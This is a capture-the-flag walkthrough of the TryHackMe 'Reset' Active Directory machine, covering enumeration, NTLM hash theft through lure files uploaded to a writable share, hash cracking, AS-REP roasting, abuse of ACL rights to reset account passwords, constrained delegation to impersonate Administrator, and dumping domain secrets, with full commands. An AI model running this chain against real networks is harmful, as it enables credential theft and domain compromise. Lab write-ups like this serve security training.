# **Reset | THM**

***
## **Difficulty = Hard**

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/6599b8b3-d0e8-4b4d-81db-5e87af3bc083)


**_My First ever CTF on Active Directory, Please make sure to leave feedbacks,If you have any doubts or questions_** 😄

***



Running our nmap scan we have

```bash
# Nmap 7.94SVN scan initiated Wed Jan 31 04:09:08 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 10.10.94.182
Nmap scan report for 10.10.94.182
Host is up (0.13s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-31 03:11:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-01-31T03:12:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Issuer: commonName=HayStack.thm.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-25T21:01:31
| Not valid after:  2024-07-26T21:01:31
| MD5:   1593:b46f:8770:a73a:9649:f3ec:e9ad:c968
|_SHA-1: 9d45:4568:8ee5:2758:e3cc:26ff:e0ca:23db:5ae6:017e
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-31T03:12:13+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-31T03:12:17
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 31 04:12:57 2024 -- 1 IP address (1 host up) scanned in 229.63 seconds
```




## **RPC Enumeration (135)**


- Enumerating RPC we get error `NT_STATUS_ACCESS_DENIED` meaning we don't have enough permissions to view files as a NULL user 



![](https://i.imgur.com/rERRztI.png)




## **DNS Enumeration (53)**

- Go ahead and add the FQDN `HayStack.thm.corp` and root domain `thm.corp` to your `/etc/hosts` file


![](https://i.imgur.com/wjgXbYb.png)


- Performing a zone transfer attack, looks like we don't have DNS Replication enabled

![](https://i.imgur.com/xdqaXih.png)




## **SMB Enumeration (139/445)**


- This was done with `smbclient`, we have READ, WRITE permissions in the `Data` share


```bash
smbclient -L \\\\10.10.94.182\\
smbclient \\\\10.10.94.182\\Data
put <location_of_any_file>
```



![](https://i.imgur.com/TsEKR40.png)



- Checking the `onboarding` directory, looks like the files are been changed, so there must be an active user on this session


![](https://i.imgur.com/ASiO711.png)




- using [this](https://www.hackingarticles.in/multiple-files-to-capture-ntlm-hashes-ntlm-theft/) article, i was made to understand that if we could put files into a share, we can try to steal password hashes using a tool called NTLM_Theft and Responder


```bash
git clone https://github.com/Greenwolf/ntlm_theft
pip3 install xlsxwriter
```


![](https://i.imgur.com/P9fGC3f.png)



## [**FootHold**](#FootHold)



- Now go ahead and run this tool with the following syntax


```bash
cd ntlm_theft
python3 ntlm_theft.py -g all -s <ATTACKER-IP> -f test


# -g: generate. Here, we specify the file types (for related attacks) to generate

# -s: The IP address of our Kali machine, In this case (tun0)

# -f: filename
```



![](https://i.imgur.com/NhM27Ou.png)



- We can go ahead and upload the `.lnk` file to our target share, but before that start up our listener `responder`



```bash
sudo responder -I tun0
```




![](https://i.imgur.com/V18EHaO.png)



- As seen above we captured the NTLMv2 hash for user `automate`, we can then go ahead and crack this hash using [JTR](#)


```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```



![](https://i.imgur.com/MWpfMSw.png)


```
automate:Passw0rd1
```


- We can't login via `psexec.py` for some reasons



![](https://i.imgur.com/4vodUXn.png)



- We can then login with `Evil-WinRM`  and get user.txt


```
evil-winrm -i 10.10.94.182 -u automate -p <PASSWORD>
```



![](https://i.imgur.com/6lKU0ji.png)


- Since my `Evil-WinRM` shell is kinda slow and unstable, also deletes my `SharpHound.exe` and no time to find whitelisted folders by AV :P, I decided to use `bloodhound-python`



```bash
bloodhound-python -ns 10.10.94.182 --dns-tcp -d THM.CORP -u <username> -p <password> -d domain.local -c all --zip
```


![](https://i.imgur.com/V40zMiM.png)


- Uploading our data to bloodhound and looking for path to `DOMAIN ADMINS@THM.CORP` 


![](https://i.imgur.com/rAkkCGk.png)



![](https://i.imgur.com/5zl9FWK.png)


- Made more enumeration and found AsRepRoastable users in which user `ERNESTO_SILVA@THM.CORP` is an high value target


![](https://i.imgur.com/Wc2ZJh6.png)


- Using `Impacket-GetNPUsers` we can go ahead and retrive the `krb5asrep` hash for each users respectively


```
impacket-GetNPUsers -request -format john -no-pass thm.corp/ERNESTO_SILVA
```



![](https://i.imgur.com/PFguT4k.png)



- Unfortunately, the only user in which their hash could be cracked is `TABATHA_BRITT`




![](https://i.imgur.com/KGTwrkL.png)



```
marlboro(1985):TABATHA_BRITT@THM.CORP
```



looks like `TABATHA_BRITT` can also do the job



![](https://i.imgur.com/rip6LkW.png)



Got same **access denied** error and i couldn't load tools, even using `dacledit.py` gave me alot of errors, Here are 2 resource to help if you wanna go down this path though -:


1. [https://www.adamcouch.co.uk/dacl-trouble-genericall-on-ous/](https://www.adamcouch.co.uk/dacl-trouble-genericall-on-ous/)
2. [Youtube_Installing_dacledit.py_In_Kali_Linux](https://www.youtube.com/watch?v=O_VeRoT1f1k)



```bash
./dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'CECILE_WONG' -target-dn 'OU=SERVICEACCOUNTS,OU=FSR,OU=TIER 2,DC=THM,DC=CORP' HAYSTACK.THM.CORP/TABATHA_BRITT:'marlboro(1985)'
```



![](https://i.imgur.com/x9HbtR0.png)



- Navigating back to `BloodHound` for more enumeration through the user path, `TABATHA_BRITT`, We have an ACE abuse path to user `DARLA_WINTERS`



![](https://i.imgur.com/nWTXoki.png)



- Then user `DARLA_WINTERS` has constrained delegation enabled on the CIFS Service


> `CIFS` - Common Internet File System is used for file sharing that allows delegation of users to shares.



![](https://i.imgur.com/x9fOdty.png)


## Exploit


- From user `TABATHA_BRITT` we have `SHAWNA_BRAY` **GenericAll** ACE, we can go ahead and exploit this by changing the user `SHAWNA_BRAY` Password


![](https://i.imgur.com/L5TWJC7.png)



```bash
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "THM.CORP"/"TABATHA_BRITT"%"marlboro(1985)" -S "HayStack.thm.corp"
```



- We then have `ForceChangePassword` to user `CRUZ_HALL`, we can go ahead and change this users password also



```bash
net rpc password "CRUZ_HALL" "newP@ssword2022" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssword2022" -S "HayStack.thm.corp"
```




![](https://i.imgur.com/1IdHNrE.png)


- Then for our last user which is `DARLA_WINTERS` we have **GenericWrite** ACE from user `CRUZ_HALL`, we can go ahead and change and change the password on this user also


```bash
net rpc password "DARLA_WINTERS" "newP@ssword2022" -U "THM.CORP"/"CRUZ_HALL"%"newP@ssword2022" -S "HayStack.thm.corp"
```



![](https://i.imgur.com/5HfP4fR.png)



- We can then go ahead and login to user `DARLA_WINTERS` to enumerate the constrained delegation we found on the CIFS service


```bash
xfreerdp /v:HayStack.thm.corp /u:DARLA_WINTERS /p:'newP@ssword2022'
```


![](https://i.imgur.com/44qvtrL.png)



- Unfortunately for us, we can't load tools and i am not ready for some AV evasion on a CTF 🤣, Anyways i found this two resources to be helpful for me on abusing constrained delegation using Kali


1. [https://wadcoms.github.io/wadcoms/Impacket-getST-Creds/](https://wadcoms.github.io/wadcoms/Impacket-getST-Creds/)
2. [https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)


- First of all retrieve a ticket for an impersonated user to the service we have delegation rights to using `impacket-getST`



```bash
impacket-getST -spn cifs/HayStack.thm.corp -dc-ip 10.10.200.9 -impersonate Administrator thm.corp/DARLA_WINTERS:'newP@ssword2022'
```



![](https://i.imgur.com/vMzGjTz.png)



- Now export this file into a variable called `KRB5CCNAME`


```bash
export KRB5CCNAME=Administrator.ccache
```



![](https://i.imgur.com/9xroMub.png)



- We can then go ahead and dump the SAM archive of the DC, **"Haystack.thm.corp"**, using `impacket-secretsdump`




```bash
impacket-secretsdump -k -no-pass HayStack.thm.corp
```




![](https://i.imgur.com/iwC11kX.png)


- I couldn't login with the Administrator hash so i decided to use `CECILE_WONG` account which is also in the Domain Admins group on the DC




![](https://i.imgur.com/3ITToZI.png)


- Go ahead and login via `Evil-WinRM` and retrieve the Admin flag


![](https://i.imgur.com/QYZCn5p.png)



Arigatou gozaimasu 😊


![](https://i.pinimg.com/originals/35/4a/eb/354aebbc05b98731b004a6378c03b4dc.gif)




<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

